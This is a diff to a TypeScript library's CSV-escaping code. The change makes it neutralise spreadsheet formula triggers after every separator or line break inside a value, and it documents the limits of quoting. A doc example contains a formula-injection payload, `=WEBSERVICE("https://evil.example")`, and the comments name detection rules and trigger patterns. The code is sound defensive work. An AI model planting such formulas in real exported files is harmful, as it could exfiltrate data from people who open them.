@@ -536,11 +536,14 @@ export function encodeLogValue(
  * plus the full-width `=` `+` `-` `@` (U+FF1D, U+FF0B, U+FF0D, U+FF20), which some
  * locales read as formulas too.
  *
- * `escapeCsvField` also tests the NFKC form of the value's head, because the rule matches
- * the scan's `nfkc` variant: NFKC folds the small `=` `+` `-` `@` (U+FE66, U+FE62, U+FE63,
- * U+FE6B) onto triggers and the full-width `"` and `'` (U+FF02, U+FF07) onto the leading
- * run. The rule's percent- and HTML-decoded variants have no counterpart here, since no
- * spreadsheet decodes a cell that way.
+ * `escapeCsvField` looks for this pattern wherever a reader may start a field: at the
+ * start of the value and after each boundary inside it. It does so in one linear pass that
+ * reads the classes off this pattern (see {@link formulaLeadStarts}), not by running the
+ * pattern at each boundary. It also tests the NFKC form of each head, because the rule
+ * matches the scan's `nfkc` variant: NFKC folds the small `=` `+` `-` `@` (U+FE66, U+FE62,
+ * U+FE63, U+FE6B) onto triggers and the full-width `"` and `'` (U+FF02, U+FF07) onto the
+ * leading run. The rule's percent- and HTML-decoded variants have no counterpart here,
+ * since no spreadsheet decodes a cell that way.
  */
 // biome-ignore lint/suspicious/noControlCharactersInRegex: U+001C to U+001F are whitespace to the readers that trim them
 const CSV_FORMULA_LEAD = /^[\s\x1c-\x1f\x85'"]*[=+\-@\t\r\n\uff1d\uff0b\uff0d\uff20]/;
@@ -559,17 +562,182 @@ const CSV_NFKC_LEADING_RUN = /^[\s\x1c-\x1f\x85'"\uff02\uff07]*/;
 const CSV_NFKC_TAIL = 16;
 
 /**
- * The NFKC form of a value's leading run and the {@link CSV_NFKC_TAIL} characters after
- * it, which is as far as {@link CSV_FORMULA_LEAD} can match.
- *
- * Each character of the run normalizes to one code unit, so the result outgrows the
- * slice by at most 18 units per tail character, whatever the value's length. A cut can
- * part a character from a later combining mark, which can only leave a trigger that
- * composition would have absorbed, so the check errs towards the prefix.
+ * Characters after which a reader may start a field inside a value: the separators readers
+ * commonly split on, and the line breaks that end a record. `escapeCsvField` adds each
+ * character of the configured delimiter.
  */
-function normalizedHead(value: string): string {
-	const run = CSV_NFKC_LEADING_RUN.exec(value)?.[0].length ?? 0;
-	return value.slice(0, run + CSV_NFKC_TAIL).normalize("NFKC");
+const CSV_BOUNDARIES = ",;\t\r\n";
+
+/** A code unit in the leading run or the trigger class of {@link CSV_FORMULA_LEAD}. */
+const CSV_UNIT_RUN_OR_TRIGGER = 1;
+
+/** A code unit in the trigger class of {@link CSV_FORMULA_LEAD}. */
+const CSV_UNIT_TRIGGER = 2;
+
+/** A code unit in {@link CSV_NFKC_LEADING_RUN}. */
+const CSV_UNIT_NFKC_RUN = 4;
+
+/** Set on every computed entry of the class table, so a zero entry means "not computed". */
+const CSV_UNIT_KNOWN = 8;
+
+/** The classes of each UTF-16 code unit, filled in on first use. */
+let csvUnitClasses: Uint8Array | undefined;
+
+/**
+ * The classes of one UTF-16 code unit, read off the patterns themselves so the scan cannot
+ * drift from them. Neither pattern has the `u` flag, so both match code units.
+ */
+function csvUnitClass(unit: number): number {
+	csvUnitClasses ??= new Uint8Array(0x10000);
+	const known = csvUnitClasses[unit];
+	if (known !== 0) return known;
+
+	const character = String.fromCharCode(unit);
+	const computed =
+		CSV_UNIT_KNOWN |
+		(CSV_FORMULA_LEAD.test(`${character}=`) ? CSV_UNIT_RUN_OR_TRIGGER : 0) |
+		(CSV_FORMULA_LEAD.test(character) ? CSV_UNIT_TRIGGER : 0) |
+		(CSV_NFKC_LEADING_RUN.exec(character)?.[0] === character ? CSV_UNIT_NFKC_RUN : 0);
+	csvUnitClasses[unit] = computed;
+	return computed;
+}
+
+/** Matches any of {@link CSV_BOUNDARIES}. */
+const CSV_BOUNDARY = new RegExp(`[${CSV_BOUNDARIES}]`);
+
+/** The code points of {@link CSV_BOUNDARIES}. */
+const CSV_BOUNDARY_CODE_POINTS: readonly number[] = [...CSV_BOUNDARIES].map(
+	(character) => character.codePointAt(0) ?? -1,
+);
+
+/**
+ * Index 0 and the index after each boundary in `value`, ascending: every index at which a
+ * reader that splits on a boundary may start a field. A delimiter character outside the
+ * BMP is a surrogate pair in the value, so the value is read one code point at a time.
+ */
+function csvFieldStarts(value: string, delimiter: string): number[] {
+	const starts = [0];
+	const delimiterCharacters = [...delimiter];
+	const hasBoundary =
+		CSV_BOUNDARY.test(value) || delimiterCharacters.some((character) => value.includes(character));
+	if (!hasBoundary) return starts;
+
+	const codePoints = [
+		...CSV_BOUNDARY_CODE_POINTS,
+		...delimiterCharacters.map((character) => character.codePointAt(0) ?? -1),
+	];
+	for (let index = 0; index < value.length; ) {
+		const codePoint = value.codePointAt(index) ?? -1;
+		index += codePoint > 0xffff ? 2 : 1;
+		if (codePoints.includes(codePoint)) starts.push(index);
+	}
+	return starts;
+}
+
+/**
+ * The first index in `[from, to)` whose character ends both leading runs, so that whether
+ * a formula leads there does not depend on anything after it: a character outside the
+ * NFKC run that is a trigger or is outside the raw run. `to` when there is none.
+ */
+function settledIndex(value: string, from: number, to: number): number {
+	for (let index = from; index < to; index++) {
+		const unitClass = csvUnitClass(value.charCodeAt(index));
+		const isTrigger = (unitClass & CSV_UNIT_TRIGGER) !== 0;
+		const inRawRunOnly = !isTrigger && (unitClass & CSV_UNIT_RUN_OR_TRIGGER) !== 0;
+		if ((unitClass & CSV_UNIT_NFKC_RUN) === 0 && !inRawRunOnly) return index;
+	}
+	return to;
+}
+
+/**
+ * Whether the NFKC form of the {@link CSV_NFKC_TAIL} characters from `start` opens with a
+ * formula lead. A cut can part a character from a later combining mark, which can only
+ * leave a trigger that composition would have absorbed, so the check errs towards the
+ * prefix. The result outgrows the slice by at most 18 units per character, whatever the
+ * value's length.
+ */
+function nfkcTailLeads(value: string, start: number): boolean {
+	return CSV_FORMULA_LEAD.test(value.slice(start, start + CSV_NFKC_TAIL).normalize("NFKC"));
+}
+
+/**
+ * The field starts at which a formula leads, where `escapeCsvField` inserts an apostrophe.
+ *
+ * A formula leads at an index when {@link CSV_FORMULA_LEAD} matches the value from there,
+ * or matches the NFKC form of its head: the {@link CSV_NFKC_LEADING_RUN} from there and
+ * the {@link CSV_NFKC_TAIL} characters after it. Running the pattern at each field start
+ * would rescan a leading run once for every boundary inside it, which is quadratic: a
+ * million LFs are a million boundaries in one run. Instead the field starts are taken from
+ * last to first, and each folds the characters between it and the next field start into
+ * the answer from right to left, starting afresh at the first character that ends both
+ * runs. Each character is read at most twice, so the work is linear in the value's length.
+ *
+ * - The raw pattern leads at an index when its character is a trigger, or is in the
+ *   leading run and the pattern leads at the next index.
+ * - Each character of the NFKC run normalizes, on its own, to one character of the raw
+ *   leading run, and composes with no neighbour. Both hold for every code point. So the
+ *   head's NFKC form is the run mapped one character at a time, then the NFKC form of the
+ *   tail. It leads when the run holds a TAB, CR or LF, the run's only triggers, or when the
+ *   tail's NFKC form leads. Each tail is normalized once, whatever the number of field
+ *   starts in its run.
+ *
+ * @param value - The text, without NUL.
+ * @param fieldStarts - Ascending, from {@link csvFieldStarts}.
+ * @returns The field starts at which a formula leads, ascending.
+ */
+function formulaLeadStarts(value: string, fieldStarts: readonly number[]): number[] {
+	const leads: number[] = [];
+	// The answer at index `known`: whether the raw pattern leads there, where the NFKC run
+	// from there ends, and whether that run holds a trigger.
+	let known = value.length;
+	let rawLeads = false;
+	let runEnd = value.length;
+	let runHasTrigger = false;
+	let tailStart = -1;
+	let tailLeads = false;
+
+	for (let position = fieldStarts.length - 1; position >= 0; position--) {
+		const start = fieldStarts[position] ?? 0;
+		const settled = settledIndex(value, start, known);
+		if (settled < known) {
+			known = settled;
+			rawLeads = (csvUnitClass(value.charCodeAt(settled)) & CSV_UNIT_TRIGGER) !== 0;
+			runEnd = settled;
+			runHasTrigger = false;
+		}
+		for (let index = known - 1; index >= start; index--) {
+			const unitClass = csvUnitClass(value.charCodeAt(index));
+			const isTrigger = (unitClass & CSV_UNIT_TRIGGER) !== 0;
+			rawLeads = isTrigger || ((unitClass & CSV_UNIT_RUN_OR_TRIGGER) !== 0 && rawLeads);
+			if ((unitClass & CSV_UNIT_NFKC_RUN) === 0) {
+				runEnd = index;
+				runHasTrigger = false;
+			} else if (isTrigger) {
+				runHasTrigger = true;
+			}
+		}
+		known = start;
+
+		if (!rawLeads && !runHasTrigger && tailStart !== runEnd) {
+			tailStart = runEnd;
+			tailLeads = nfkcTailLeads(value, runEnd);
+		}
+		if (rawLeads || runHasTrigger || tailLeads) leads.push(start);
+	}
+	return leads.reverse();
+}
+
+/** `value` with an apostrophe inserted before each of the ascending `indexes`. */
+function insertApostrophes(value: string, indexes: readonly number[]): string {
+	if (indexes.length === 0) return value;
+	const parts: string[] = [];
+	let from = 0;
+	for (const index of indexes) {
+		parts.push(value.slice(from, index), "'");
+		from = index;
+	}
+	parts.push(value.slice(from));
+	return parts.join("");
 }
 
 /**
@@ -577,19 +745,17 @@ function normalizedHead(value: string): string {
  *
  * `"`, CR and LF because RFC 4180 sections 2.6 and 2.7 require it. Comma, semicolon and
  * TAB whatever the configured delimiter, because the reader may split on a different
- * separator than the writer used (Excel follows the locale's list separator), and an
- * unquoted separator there starts a new cell whose leading characters were never checked.
- * Quoting is always valid under RFC 4180 and changes no value.
+ * separator than the writer used (Excel follows the locale's list separator). Quoting is
+ * always valid under RFC 4180 and changes no value.
  *
- * Quoting does not reliably protect any column from a reader that uses another separator.
- * A quote opens a field only at the start of a field as the reader sees it. A later field
- * starts after the writer's delimiter, which that reader does not split on, so it takes
- * the quote literally, and a separator or line break inside the value still starts a
- * cell, or a row, whose leading characters were never checked. The first column is safe
- * only when that reader splits on comma, semicolon or TAB and no earlier cell has thrown
- * it out of step: a later value holding its separator followed by `"` leaves it inside a
- * quoted field across the line break. Read the file with the delimiter it was written
- * with.
+ * Quoting protects only a reader that is in step with the writer, since a quote opens a
+ * field only at the start of a field as the reader sees it. A reader that splits on
+ * another separator takes the quote literally in later columns, and a reader that ignores
+ * quotes does so everywhere. For those readers, a cell that starts inside a value is
+ * neutralised by the apostrophe `escapeCsvField` inserts after each of these characters
+ * and each character of the delimiter, not by the quotes. A reader that splits on any
+ * other character, such as `|` or a space, gets no apostrophe there, and quoting protects
+ * it in the first column at most. Read the file with the delimiter it was written with.
  */
 const CSV_QUOTE_REQUIRED = /[",;\t\r\n]/;
 
@@ -603,9 +769,19 @@ const CSV_QUOTE_REQUIRED = /[",;\t\r\n]/;
  * `=` `+` `-` `@` are treated as triggers too, following the OWASP CSV Injection list,
  * and so is any character whose NFKC form is a trigger or part of the leading run.
  *
- * Two separate jobs, in order: neutralise the formula trigger with a leading apostrophe,
- * then apply RFC 4180 quoting so the field cannot break the row for a reader that splits
- * on the same delimiter.
+ * Two separate jobs, in order: neutralise formula triggers with apostrophes, then apply
+ * RFC 4180 quoting so the field cannot break the row for a reader that splits on the same
+ * delimiter.
+ *
+ * A trigger is neutralised wherever a reader may start a field in text: at the start of
+ * the value, and right after each comma, semicolon, TAB, CR, LF or delimiter character
+ * inside it. The apostrophe goes in front of the leading run there, as it does at the
+ * start. A reader that splits on any of those characters, or that ignores quotes,
+ * therefore finds every field that starts inside the value neutralised, in every column,
+ * even after an earlier cell has thrown it out of step. A field that starts at a boundary
+ * at the very end of the value runs on into the file's closing quote, delimiter or line
+ * break and then the next cell, which is neutralised in its own right. The work is linear
+ * in the value's length.
  *
  * **Numbers, booleans and bigints are never prefixed.** They came from the application's
  * own types and cannot carry a formula, so `-1234` exports as a negative number while
@@ -614,24 +790,22 @@ const CSV_QUOTE_REQUIRED = /[",;\t\r\n]/;
  * object, whose string form repeats contents the caller may not control.
  *
  * Worth knowing before relying on it:
- * - The leading apostrophe is an Excel convention, **not** an RFC 4180 construct. Readers
- *   that do not implement it surface it as a literal character in the data.
- * - A field containing a comma, semicolon or TAB is quoted whatever the delimiter, but
- *   **quoting does not reliably protect any column from a reader that splits on a
- *   different separator**. A quote opens a field only at the start of a field as the
- *   reader sees it, and in later columns that reader does not see a field start where
- *   the writer put the quote. It takes the quote literally, so a separator inside the
- *   value starts a new cell, and a line break a new row, whose leading characters were
- *   never checked. The first column is safe only when that reader splits on comma,
- *   semicolon or TAB and no earlier cell has thrown it out of step: a later value holding
- *   its separator followed by `"` leaves it inside a quoted field across the line break.
- *   Only the trigger at the start of the whole value is neutralised. The same holds for a
- *   reader that ignores quotes, in every column. Read the file with the delimiter it was
- *   written with.
- * - A field containing any character of a multi-character delimiter is quoted too. That
- *   helps only a reader for which the quote still opens the field, which in later
- *   columns means one splitting on the whole delimiter or on its last character, so
- *   prefer a single-character delimiter.
+ * - **Values can change after a separator, by design.** A reader that uses the delimiter
+ *   the file was written with shows an apostrophe inserted after a separator as part of
+ *   the value: `"a\n=b"` reads back as `"a\n'=b"`. TAB, CR and LF are triggers themselves,
+ *   so a CRLF, a blank line or a TAB right after a separator gains one too: `"a\r\nb"`
+ *   reads back as `"a\r'\nb"`. Without it, a reader that splits on that separator would
+ *   start a cell there whose leading characters were never checked.
+ * - The apostrophe is an Excel convention, **not** an RFC 4180 construct. Readers that do
+ *   not implement it surface it as a literal character in the data.
+ * - **A reader that splits on any other character is not protected.** A value holding,
+ *   say, `|` or a space followed by a trigger gets no apostrophe there, and is quoted only
+ *   if it holds a character that requires quoting. That reader starts a live cell there:
+ *   in any column when the value is not quoted, and in any column after the first when it
+ *   is. Read the file with the delimiter it was written with.
+ * - A field containing a comma, semicolon or TAB is quoted whatever the delimiter, and so
+ *   is a field containing any character of a multi-character delimiter. Quoting changes no
+ *   value, and protects only a reader in step with the writer.
  * - NUL is removed rather than escaped, so it does not round-trip.
  * - Scanning the output with `scanForThreats` still reports a finding, by design:
  *   `CSV-FORMULA-LEAD-001` sees through the apostrophe and `CSV-DDE-001` is
@@ -647,6 +821,7 @@ const CSV_QUOTE_REQUIRED = /[",;\t\r\n]/;
  * ```ts
  * escapeCsvField("=WEBSERVICE(\"https://evil.example\")");
  * // quoted, and inert on open
+ * escapeCsvField("a\n=1+1"); // "\"a\n'=1+1\"" — inert after the line break too
  * escapeCsvField(-1234); // "-1234" — a number, not a formula
  * ```
  */
@@ -667,14 +842,13 @@ export function escapeCsvField(
 	const cleaned = text.replace(/\u0000/g, "");
 
 	// The NFKC form is only tested, never written: the rule matches the scan's `nfkc`
-	// variant, and the file keeps the value as the caller wrote it. Only the head is
-	// normalized. NFKC can expand one character to 18 (U+FDFA), so normalizing a large
-	// value could throw a RangeError and abort the export, and a match depends only on
-	// the leading run and the character after it.
-	const needsPrefix =
-		isUntrustedText &&
-		(CSV_FORMULA_LEAD.test(cleaned) || CSV_FORMULA_LEAD.test(normalizedHead(cleaned)));
-	const neutralised = needsPrefix ? `'${cleaned}` : cleaned;
+	// variant, and the file keeps the value as the caller wrote it apart from the
+	// apostrophes. Only heads are normalized. NFKC can expand one character to 18
+	// (U+FDFA), so normalizing a large value could throw a RangeError and abort the
+	// export, and a match depends only on the leading run and the character after it.
+	const neutralised = isUntrustedText
+		? insertApostrophes(cleaned, formulaLeadStarts(cleaned, csvFieldStarts(cleaned, delimiter)))
+		: cleaned;
 
 	// Any one character of a multi-character delimiter can split the row for a reader that
 	// splits on that character alone.
